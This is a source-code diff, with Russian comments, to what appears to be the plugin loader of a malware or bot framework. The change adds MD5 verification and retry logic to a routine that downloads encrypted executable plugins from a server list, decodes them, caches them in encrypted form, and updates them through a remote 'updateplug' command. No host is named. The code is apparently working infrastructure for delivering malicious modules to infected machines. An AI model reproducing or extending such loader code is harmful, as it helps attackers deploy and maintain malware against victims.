@@ -220,6 +220,16 @@ namespace PLGLoader
 		if (Buf == NULL)
 			return NULL;
 
+		// Определяем новый тип файла списка
+		// Если он новый, то передвигаем начало на новый буфер и возвращаем URL в виде <name>|md5
+		// Перед отправкой на скачку из URL нужно извлечь MD5 и сформировать нормальный URL
+		int DoubleEmptyStringPos = STR::Pos(Buf, "\r\n\r\n", 0);
+		if (DoubleEmptyStringPos > 0)
+		{
+			PDBG("ExtractPluginURL", "New format of list detected. Move pointer to new list begin.");
+			Buf += (DoubleEmptyStringPos + 4);
+		}
+
 		// Определяем позицию имени в буфере
 		int Pos = STR::Pos(Buf, PluginName, 0);
 		if (Pos < 0)
@@ -231,14 +241,13 @@ namespace PLGLoader
 		while (*End != '|') End++;
 		End++;
 
-        Start = End;
+		Start = End;
 
 		// Определяем Конец строки
 		while (*End != 0 && *End != 10 && *End != 13) End++;
 
 		// Возвращаем адрес
 		return STR::New(Start, End - Start);
-
 	}
 }
 
@@ -445,7 +454,7 @@ PCHAR Plugin::DownloadPluginList(PCHAR URL)
 }
 //---------------------------------------------------------------------------
 
-LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize)
+LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileSize, PCHAR* PluginMd5)
 {
 
 	//  Функция загружает файл плагина с сервера. Файл остаётся
@@ -458,6 +467,8 @@ LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileS
 	// Запускаем цикл загрузки плагина
 	bool UpdateList = false;
 	DWORD UpdateCount = 0; // Счётчик обновлений списка
+
+	if (PluginMd5 != NULL) *PluginMd5 = NULL;
 
     LPBYTE Module = NULL;
 	do
@@ -495,6 +506,20 @@ LPBYTE Plugin::DownloadFile(PCHAR PluginName, PCHAR PluginsListURL, DWORD *FileS
 
 			pSleep(Interval);
 		}
+
+		// Определяем MD5 сумму в URL и обрабатываем соответственно URL
+		int md5pos = STR::Pos(URL, "|", 0);
+		if (md5pos > 0)
+		{
+			PCHAR Md5Sum = STR::New(URL + md5pos + 1);
+			URL[md5pos] = '\0';
+
+			PDBG("Plugins", "DownloadFile: MD5 detected in URL (url='%s' md5='%s').",
+				URL, Md5Sum);
+			
+			if (PluginMd5 != NULL) *PluginMd5 = Md5Sum;
+		}
+
 
 		// Загружаем документ
 
@@ -591,6 +616,31 @@ LPBYTE Plugin::Decode(LPBYTE Buffer, DWORD BufferSize, bool IsExecutable, DWORD 
 
 //---------------------------------------------------------------------------
 
+char* CalcMd5SummForBuffer(const void* data, DWORD size, char* buffer, DWORD buffer_size)
+{
+	if (buffer_size < 33) return NULL;
+
+	BYTE    summ[16];
+	MD5_CTX ctx;
+
+	MD5Init(&ctx);
+	MD5Update( &ctx, (unsigned char*)data, size );
+
+	MD5Final(summ, &ctx);
+
+	m_memset(buffer, 0, 33);
+
+	char hexval[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
+	for (int j = 0; j < ARRAYSIZE(summ); j++)
+	{
+		buffer[j*2] = hexval[((summ[j] >> 4) & 0x0F)];
+		buffer[(j*2) + 1] = hexval[(summ[j]) & 0x0F];
+	}
+	return buffer;
+}
+
+//---------------------------------------------------------------------------
+
 LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool IsExecutable)
 {
 	// Функция загружает и дектодирует плагин
@@ -598,87 +648,127 @@ LPBYTE Plugin::Download(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size, bool
 }
 //---------------------------------------------------------------------------
 
+
 LPBYTE Plugin::DownloadEx(PCHAR PluginName, PCHAR PluginListURL, DWORD *Size,
 				  bool IsExecutable, bool UseCache, PCHAR CachePath)
 {
-	// Функция загружает и декодирует плагин используя
-	// дополнительные настройки
-	if (Size != NULL)
-		*Size = 0;
-
-    // Получаем имя файла кэша
-	PCHAR CacheFileName = NULL;
-	if (UseCache)
-		CacheFileName = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
-
-	PDBG("Plugins", "DownloadEx: GetPluginCacheFileName() CacheFileName='%s'", CacheFileName);
-
-	DWORD BufSize = 0;
-	LPBYTE Buffer = NULL;
-
-	// Проверяем наличие файла в кэше и флаг использования кеша
-	if (CacheFileName != NULL)
+	// Начало цикла по выкачиванию файла плага.
+	// Поддерживает проверку MD5 плага.
+	while (true)
 	{
-		PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'", CacheFileName);
+		// Функция загружает и декодирует плагин используя
+		// дополнительные настройки
+		if (Size != NULL)
+			*Size = 0;
+
+		// Получаем имя файла кэша
+		PCHAR CacheFileName = NULL;
+		if (UseCache)
+			CacheFileName = PLGCACHE::GetPluginCacheFileName(CachePath, PluginName);
+
+		PDBG("Plugins", "DownloadEx: GetPluginCacheFileName() CacheFileName='%s'", CacheFileName);
+
+		DWORD BufSize = 0;
+		LPBYTE Buffer = NULL;
+		PCHAR  ReceivedMd5 = NULL;
+
+		// Проверяем наличие файла в кэше и флаг использования кеша
+		if (CacheFileName != NULL)
+		{
+			PDBG("Plugins", "DownloadEx: try ReadToBuffer() CacheFileName='%s'", CacheFileName);
+			
+			Buffer = (LPBYTE)CryptFile::ReadToBuffer(CacheFileName, &BufSize, NULL);
+			
+			PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X", Buffer);
+		}
+
+		// загружаем файл плагина из сети, если:
+		// 1) выставлен флаг использования кеша и не удалось прочитать файл
+		// 2) не выставлен флаг использования кеша
+		bool Downloaded = false;
+		if (Buffer == NULL)
+		{
+			PDBG("Plugins", "DownloadEx: try DownloadFile() CacheFileName='%s'", CacheFileName);
+
+			Buffer = DownloadFile(PluginName, PluginListURL, &BufSize, &ReceivedMd5);
+			Downloaded = true;
 		
-		Buffer = (LPBYTE)CryptFile::ReadToBuffer(CacheFileName, &BufSize, NULL);
+			PDBG("Plugins", "DownloadEx: DownloadFile() result 0x%X size=%u", Buffer, BufSize);
+		}
+
+		if (Buffer == NULL)
+		{
+			if (ReceivedMd5 != NULL) STR::Free(ReceivedMd5);
+			return NULL;
+		}
+
+
+		// 2. Расшифровываем плагин
+		// Важный момент: файл НЕ БУДЕТ раскодироватся только в случае, если 
+		// выставлен флаг "IsExecutable" и присланный файл действительно имеет PE 
+		// сигнатуру
+
+		LPBYTE Module = NULL;
+
+		if (!IsExecutable || !IsExecutableFile(Buffer))
+		{
+			Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
+			PDBG("Plugins", "DownloadEx: loaded buffer decoded.");
+		}
+		else
+		{
+			PDBG("Plugins", "DownloadEx: loaded buffer NOT decoding.");
+			Module = Buffer;
+		}
+
+		// Если файл был выкачан и была получена MD5 - проверяем MD5 сумму.
+		// Если контрольная сумма не совпала - пробуем подгрузить всё заново.
+		if (ReceivedMd5 != NULL && Module != NULL)
+		{
+			char CalculatedMd5[40];
+			CalcMd5SummForBuffer(Module, BufSize, CalculatedMd5, sizeof(CalculatedMd5));
+			DWORD Md5CompareResult = m_lstrncmp(ReceivedMd5, CalculatedMd5, 32);
+
+			PDBG("Plugins", "DownloadEx: r_md5='%s' c_md5='%s' cmp_result=%d.", 
+				ReceivedMd5, CalculatedMd5, Md5CompareResult);
+
+			if (ReceivedMd5 != NULL) STR::Free(ReceivedMd5);
+
+			if (Md5CompareResult != 0)
+			{
+				// Освобождаем ресурсы
+				MemFree(Buffer);
+				if (Module != Buffer) MemFree(Module);
+				STR::Free(CacheFileName);
+
+				// Немного спим и запускаем закачку заново
+				PDBG("Plugins", "DownloadEx: ReceivedMd5 and CalculatedMd5 are not equal. Sleeping 30 sec and trying again.");
+				pSleep(30 * 1000);
+				continue;
+			}
+		}
+
+		// При необходимости кэшируем файл:
+		// когда выставлен флаг использования кеша и файл был скачан из сети
+		if (CacheFileName != NULL && Downloaded && Module != NULL)
+		{
+			PDBG("Plugins", "DownloadEx: writing file to CacheFileName='%s'", CacheFileName);
+			CryptFile::WriteFromBuffer(CacheFileName, Module, BufSize, NULL);
+		}
+
+		// Освобождаем данные
+		if (Module != Buffer) MemFree(Buffer);
+		STR::Free(CacheFileName);
+
+
+		// Возвращаем результат
+		if (Size != NULL)
+			*Size = BufSize;
 		
-		PDBG("Plugins", "DownloadEx: ReadToBuffer() Buffer=0x%X", Buffer);
+		return Module;
 	}
 
-	// загружаем файл плагина из сети, если:
-	// 1) выставлен флаг использования кеша и не удалось прочитать файл
-	// 2) не выставлен флаг использования кеша
-	bool Downloaded = false;
-	if (Buffer == NULL)
-	{
-		PDBG("Plugins", "DownloadEx: try DownloadFile() CacheFileName='%s'", CacheFileName);
-
-		Buffer = DownloadFile(PluginName, PluginListURL, &BufSize);
-		Downloaded = true;
-	
-		PDBG("Plugins", "DownloadEx: DownloadFile() result 0x%X", Buffer);
-    }
-
-	if (Buffer == NULL)
-		return NULL;
-
-
-	// 2. Расшифровываем плагин
-	// Важный момент: файл НЕ БУДЕТ раскодироватся только в случае, если 
-	// выставлен флаг "IsExecutable" и присланный файл действительно имеет PE 
-	// сигнатуру
-
-	LPBYTE Module = NULL;
-
-	if (!IsExecutable || !IsExecutableFile(Buffer))
-	{
-		Module = Decode(Buffer, BufSize, IsExecutable, &BufSize);
-		PDBG("Plugins", "DownloadEx: loaded buffer decoded.");
-	}
-	else
-	{
-		PDBG("Plugins", "DownloadEx: loaded buffer NOT decoding.");
-		Module = Buffer;
-	}
-
-	// При необходимости кэшируем файл:
-	// когда выставлен флаг использования кеша и файл был скачан из сети
-	if (CacheFileName != NULL && Downloaded && Module != NULL)
-	{
-		PDBG("Plugins", "DownloadEx: writing file to CacheFileName='%s'", CacheFileName);
-		CryptFile::WriteFromBuffer(CacheFileName, Module, BufSize, NULL);
-	}
-
-	// Освобождаем данные
-	if (Module != Buffer) MemFree(Buffer);
-	STR::Free(CacheFileName);
-
-
-    // Возвращаем результат
-	if (Size != NULL)
-		*Size = BufSize;
-	return Module;
+	return NULL;
 }
 //---------------------------------------------------------------------------
 
@@ -740,15 +830,6 @@ LPBYTE Plugin::DownloadFromCache(PCHAR PluginName, bool IsExecutable,  PCHAR Cac
 //---------------------------------------------------------------------------
 const char* Plugin::CommandUpdatePlug = "updateplug";
 
-void CalcMd5SummForBuffer(const void* data, DWORD size, BYTE summ[16])
-{
-	MD5_CTX ctx;	
-
-	MD5Init(&ctx);
-	MD5Update( &ctx, (unsigned char*)data, size );
-
-	MD5Final(summ, &ctx);
-}
 
 bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
@@ -782,16 +863,16 @@ bool Plugin::ExecuteUpdatePlug(PTaskManager Manager, PCHAR Command, PCHAR Args)
 		PDBG("Plugins", "ExecuteUpdatePlug: compare md5 summs");
 		if (CachedFile != NULL)
 		{
-			BYTE sumCached[16];
-			BYTE sumNetwork[16];
+			char sumCached[40];
+			char sumNetwork[40];
 
-			m_memset(sumCached, 0, 16);
-			m_memset(sumNetwork, 0, 16);
+			m_memset(sumCached, 0, sizeof(sumCached));
+			m_memset(sumNetwork, 0, sizeof(sumNetwork));
 
-			CalcMd5SummForBuffer(CachedFile, CachedFileSize, sumCached);
-			CalcMd5SummForBuffer(NetworkFile, NetworkFileSize, sumNetwork);
+			CalcMd5SummForBuffer(CachedFile, CachedFileSize, sumCached, sizeof(sumCached));
+			CalcMd5SummForBuffer(NetworkFile, NetworkFileSize, sumNetwork, sizeof(sumNetwork));
 
-			int sumCompareResult = m_memcmp(sumCached, sumNetwork, 16);
+			int sumCompareResult = m_memcmp(sumCached, sumNetwork, 32);
 			PDBG("Plugins", "ExecuteUpdatePlug: sumCompareResult=%d", sumCompareResult);
 
 			// Если сумма одинакова - ничего не делаем.
